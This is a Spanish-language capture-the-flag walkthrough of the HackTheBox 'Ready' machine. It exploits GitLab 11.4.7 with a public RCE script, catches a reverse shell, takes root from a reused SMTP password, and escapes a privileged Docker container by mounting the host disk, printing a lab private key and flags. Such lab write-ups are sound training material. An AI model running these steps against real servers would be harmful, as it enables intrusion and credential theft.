---
tags:
title: Ready - Easy (HTB)
permalink: /Ready-HTB-Writeup
toc: true
toc_label: Topics
toc_sticky: true
sidebar: main
---
---
# Recon

```bash
nmap -sCV -p80,5080 10.129.227.132                                         
Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-06 01:56 -0300
Nmap scan report for 10.129.227.132
Host is up (0.56s latency).

PORT     STATE  SERVICE VERSION
80/tcp   closed http
5080/tcp open   http    nginx
|_http-trane-info: Problem with XML parsing of /evox/about
| http-robots.txt: 53 disallowed entries (15 shown)
| / /autocomplete/users /search /api /admin /profile 
| /dashboard /projects/new /groups/new /groups/*/edit /users /help 
|_/s/ /snippets/new /snippets/*/edit
| http-title: Sign in \xC2\xB7 GitLab
|_Requested resource was http://10.129.227.132:5080/users/sign_in

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 38.61 seconds
```

## Website / Port 5080

Tengo una pagina de gitlab.

![image-center](/assets/images/Pasted image 20260106015823.png)
## Shell as git @container

Por lo que como no tengo credenciales , cree una cuenta.

![image-center](/assets/images/Pasted image 20260106015850.png)
### CVE
Veo que corre la versión `11.4.7` de la edición comunidad de `Gitlab`.

![image-center](/assets/images/Pasted image 20260106141342.png)
### Exploit

Buscando en internet esta versión es vulnerable a `Ejecucion Remota de Comandos (RCE)`, en este repositorio encontré un script [automatizado](https://github.com/dotPY-hax/gitlab_RCE)

Después de clonarlo, solo tengo que indicarle la `url` de la pagina, y además mi `ip`.

```bash
 python3 gitlab_rce.py http://10.129.227.132:5080 10.10.17.19
Gitlab Exploit by dotPY [insert fancy ascii art]
registering D6CUchJsTW:EFypd0dqCk - 200
Getting version of http://10.129.227.132:5080 - 200
The Version seems to be 11.4.7! Choose wisely
delete user D6CUchJsTW - 200
[0] - GitlabRCE1147 - RCE for Version <=11.4.7
[1] - GitlabRCE1281LFIUser - LFI for version 10.4-12.8.1 and maybe more
[2] - GitlabRCE1281RCE - RCE for version 12.4.0-12.8.1 - !!RUBY REVERSE SHELL IS VERY UNRELIABLE!! WIP
type a number and hit enter to choose exploit: 0
Start a listener on port 443 and hit enter (nc -vlnp 443)
registering 4SVQxcF5dc:sYm3KQUWR0 - 200
hacking in progress - 200
```

Y seleccionando la opción `0` que corresponde a la versión con la que corre este servicio, recibo la shell en mi listener `nc`.

```bash
nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.17.19] from (UNKNOWN) [10.129.227.132] 37702
bash: cannot set terminal process group (522): Inappropriate ioctl for device
bash: no job control in this shell
git@gitlab:~/gitlab-rails/working$ whoami
whoami
git
git@gitlab:~/gitlab-rails/working$ 
```

```bash
git@gitlab:/home/dude$ cat user.txt 
ad54cb450dc82046595dd3157a157c84
```
## Shell as root @container

En el directorio `backup` de la maquina, veo archivos `docker` por lo que todo indica que estoy dentro de un contenedor.

```bash
git@gitlab:/opt/backup$ cat docker-compose.yml 
version: '2.4'

services:
  web:
    image: 'gitlab/gitlab-ce:11.4.7-ce.0'
    restart: always
    hostname: 'gitlab.example.com'
    environment:
      GITLAB_OMNIBUS_CONFIG: |
        external_url 'http://172.19.0.2'
        redis['bind']='127.0.0.1'
        redis['port']=6379
        gitlab_rails['initial_root_password']=File.read('/root_pass')
    networks:
      gitlab:
        ipv4_address: 172.19.0.2
    ports:
      - '5080:80'
      #- '127.0.0.1:5080:80'
      #- '127.0.0.1:50443:443'
      #- '127.0.0.1:5022:22'
    volumes:
      - './srv/gitlab/config:/etc/gitlab'
      - './srv/gitlab/logs:/var/log/gitlab'
      - './srv/gitlab/data:/var/opt/gitlab'
      - './root_pass:/root_pass'
      - '/opt/user:/home/dude/'
    privileged: true
    restart: unless-stopped
    #mem_limit: 1024m

networks:
  gitlab:
    driver: bridge
    ipam:
      config:
        - subnet: 172.19.0.0/16
```
### Credentials

Además viendo el contenido del archivo `gitlab.rb`, veo muchos comentarios.

```bash
## GitLab configuration settings
##! This file is generated during initial installation and **is not** modified
##! during upgrades.
##! Check out the latest version of this file to know about the different
##! settings that can be configured by this file, which may be found at:
##! https://gitlab.com/gitlab-org/omnibus-gitlab/raw/master/files/gitlab-config-template/gitlab.rb.template


## GitLab URL
##! URL on which GitLab will be reachable.
##! For more details on configuring external_url see:
##! https://docs.gitlab.com/omnibus/settings/configuration.html#configuring-the-external-url-for-gitlab
# external_url 'GENERATED_EXTERNAL_URL'
<SNIP>
```

Pero viendo el mismo archivo y sacando los comentarios, veo unas credenciales.

```bash
git@gitlab:/opt/backup$ cat gitlab.rb | grep -vE "^#" | uniq -u
gitlab_rails['smtp_password'] = "wW59U!ZKMbG9+*#h"
```
### Mount disk

Con las mismas migre al usuario `root` en el contenedor.

```
git@gitlab:/opt/backup$ su root
Password: 
```

Luego de una enumeración no encontré una manera de escapar de este contenedor al host, pero como soy `root`, puedo hacer algo parecido a lo que hice en la maquina `reddish`, que es montar el disco `/dev/sda2` en un directorio que yo vaya a crear, ya que el mismo disco en este contenedor, solo monto el directorio `/root_pass` de la maquina host.

```bash
root@gitlab:/opt/backup# df -h
Filesystem      Size  Used Avail Use% Mounted on
overlay         9.3G  7.5G  1.7G  83% /
tmpfs            64M     0   64M   0% /dev
tmpfs           2.0G     0  2.0G   0% /sys/fs/cgroup
/dev/sda2       9.3G  7.5G  1.7G  83% /root_pass
shm              64M  1.3M   63M   3% /dev/shm
```

Debido a que hay una tarea programada el cual me borra la montura, lo que hice fue crear todo en la misma linea, desde montar el directorio, hasta ver el contenido que me interesa como la `root` flag.

Primero si o si tengo que crear el directorio donde voy a realizar la montura.

```bash
root@gitlab:/opt/backup# mkdir -p /mnt/host
```
### id_rsa

Y luego en un one-liner, visualizo el contenido de la clave `id_rsa` de root de la maquina principal.

```bash
root@gitlab:/mnt/host# mount /dev/sda2 /mnt/host/; cat /mnt/host/root/.ssh/id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAvyovfg++zswQT0s4YuKtqxOO6EhG38TR2eUaInSfI1rjH09Q
sle1ivGnwAUrroNAK48LE70Io13DIfE9rxcotDviAIhbBOaqMLbLnfnnCNLApjCn
6KkYjWv+9kj9shzPaN1tNQLc2Rg39pn1mteyvUi2pBfA4ItE05F58WpCgh9KNMlf
YmlPwjeRaqARlkkCgFcHFGyVxd6Rh4ZHNFjABd8JIl+Yaq/pg7t4qPhsiFsMwntX
TBKGe8T4lzyboBNHOh5yUAI3a3Dx3MdoY+qXS/qatKS2Qgh0Ram2LLFxib9hR49W
rG87jLNt/6s06z+Mwf7d/oN8SmCiJx3xHgFzbwIDAQABAoIBACeFZC4uuSbtv011
YqHm9TqSH5BcKPLoMO5YVA/dhmz7xErbzfYg9fJUxXaIWyCIGAMpXoPlJ90GbGof
Ar6pDgw8+RtdFVwtB/BsSipN2PrU/2kcVApgsyfBtQNb0b85/5NRe9tizR/Axwkf
iUxK3bQOTVwdYQ3LHR6US96iNj/KNru1E8WXcsii5F7JiNG8CNgQx3dzve3Jzw5+
lg5bKkywJcG1r4CU/XV7CJH2SEUTmtoEp5LpiA2Bmx9A2ep4AwNr7bd2sBr6x4ab
VYYvjQlf79/ANRXUUxMTJ6w4ov572Sp41gA9bmwI/Er2uLTVQ4OEbpLoXDUDC1Cu
K4ku7QECgYEA5G3RqH9ptsouNmg2H5xGZbG5oSpyYhFVsDad2E4y1BIZSxMayMXL
g7vSV+D/almaACHJgSIrBjY8ZhGMd+kbloPJLRKA9ob8rfxzUvPEWAW81vNqBBi2
3hO044mOPeiqsHM/+RQOW240EszoYKXKqOxzq/SK4bpRtjHsidSJo4ECgYEA1jzy
n20X43ybDMrxFdVDbaA8eo+og6zUqx8IlL7czpMBfzg5NLlYcjRa6Li6Sy8KNbE8
kRznKWApgLnzTkvupk/oYSijSliLHifiVkrtEY0nAtlbGlgmbwnW15lwV+d3Ixi1
KNwMyG+HHZqChNkFtXiyoFaDdNeuoTeAyyfwzu8CgYAo4L40ORjh7Sx38A4/eeff
Kv7dKItvoUqETkHRA6105ghAtxqD82GIIYRy1YDft0kn3OQCh+rLIcmNOna4vq6B
MPQ/bKBHfcCaIiNBJP5uAhjZHpZKRWH0O/KTBXq++XQSP42jNUOceQw4kRLEuOab
dDT/ALQZ0Q3uXODHiZFYAQKBgBBPEXU7e88QhEkkBdhQpNJqmVAHMZ/cf1ALi76v
DOYY4MtLf2dZGLeQ7r66mUvx58gQlvjBB4Pp0x7+iNwUAbXdbWZADrYxKV4BUUSa
bZOheC/KVhoaTcq0KAu/nYLDlxkv31Kd9ccoXlPNmFP+pWWcK5TzIQy7Aos5S2+r
ubQ3AoGBAIvvz5yYJBFJshQbVNY4vp55uzRbKZmlJDvy79MaRHdz+eHry97WhPOv
aKvV8jR1G+70v4GVye79Kk7TL5uWFDFWzVPwVID9QCYJjuDlLBaFDnUOYFZW52gz
vJzok/kcmwcBlGfmRKxlS0O6n9dAiOLY46YdjyS8F8hNPOKX6rCd
-----END RSA PRIVATE KEY-----
```
### Shell

Y coloque el contenido de la misma en un archivo en mi maquina y con `chmod 600 id_rsa` le di permisos de lectura, para poder usarla como clave de identidad para conectarme por `ssh`.

```bash
ssh root@10.129.227.132 -i id_rsa 
<SNIP>

root@ready:~# cat root.txt 
8a322a868e0843a803b8f26a73797367
```

`~Happy Hacking.`